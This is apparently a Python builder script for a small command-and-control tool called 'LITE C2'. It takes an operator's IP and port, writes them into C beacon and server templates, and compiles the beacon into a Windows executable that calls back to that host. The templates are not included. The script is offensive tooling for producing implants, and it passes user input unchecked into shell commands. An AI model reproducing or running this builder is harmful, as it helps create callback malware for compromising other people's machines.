import os
print("""

db      d888888b d888888b d88888b       .o88b. .d888b. 
88        `88'   `~~88~~' 88'          d8P  Y8 VP  `8D 
88         88       88    88ooooo      8P         odD' 
88         88       88    88~~~~~      8b       .88'   
88booo.   .88.      88    88.          Y8b  d8 j88.    
Y88888P Y888888P    YP    Y88888P       `Y88P' 888888D 
                                                       
                                                       
	""")
"""
in order to make this program work with your beacon & server you'll have to replace the Ip and port
parameters with $$IP_ATC and $$PORT
WARNING: It's meant to be executed on Linux, haevn't tested on windows
"""
IP = str(input("Introduce the server IP: "))
PORT = str(input("Introduce the port: "))
dir_ouput_name = "LITE_C2" #modify this to your liking

#function that creates a directory where the output will be placed, you can specify the name you want
def directory():
    pathing = os.environ
    if os.path.isdir(f'{pathing["PWD"]}/{dir_ouput_name}') != True:
        os.mkdir(f'{pathing["PWD"]}/{dir_ouput_name}')
    path_Mw = f'{pathing["PWD"]}/{dir_ouput_name}/'
    return path_Mw

#function that copies a template and names de copy
def copyFile():
	template_to_copy1 = "template_C2.c" #change these names with the ones you have
	template_to_copy2 = "template_server.c" 
	#it is yet to be determined if the program name must be introduced by the user or generated automatically
	name = str(input("Introduce the program name (anything you want): "))
	os.system(f"cp {template_to_copy1} {directory()}{name}.c")
	os.system(f"cp {template_to_copy2} {directory()}{name}_server.c")
	return (name)

program_name = copyFile() #also ask the user for the desired name for the program

#function that modifies the copied template with the parameters introduced previously
def ModFile_Compile(template_beacon, IPad, PORTn, nameT, template_server):
	IPad = ('"'+f'{IP}' + '"' + ';')
	PORTn = (f'{PORT}' + ';')
	nameS = (f'{nameT}_server.c')

	with open (template_beacon, "r") as program:
		content = program.read()
		content = content.replace("$$IP_ATC", IPad)
		content = content.replace("$$PORT", PORTn)
		program.close()

	with open (template_beacon, "w") as program:
		program.write(content)
		program.close()

	with open (template_server, "r") as server:
		content = server.read()
		content = content.replace("$$IP_ATC", IPad)
		content = content.replace("$$PORT", PORTn)
		server.close()

	with open (template_server, "w") as server:
		server.write(content)
		server.close()

	#compile the beacon & the server, change the command to the one you might need
	#TODO: implement the usage of makefile in order to compile the program
	#change the compilation method to the one you like
	os.system(f"i686-w64-mingw32-gcc -o {directory()}{nameT}.exe {directory()}{nameT}.c -lwininet -lwsock32")
	os.system(f"gcc {directory()}{nameS} -o {directory()}{nameT}_server")
	
	#optional if you want to delete the copied file from the template you can run the next command:
	#os.system(f"rm {directory()}{nameT}.c")
	#os.system(f"rm {directory()}{nameS}")

ModFile_Compile(f"{directory()}{program_name}.c", IP, PORT, program_name, f"{directory()}{program_name}_server.c")



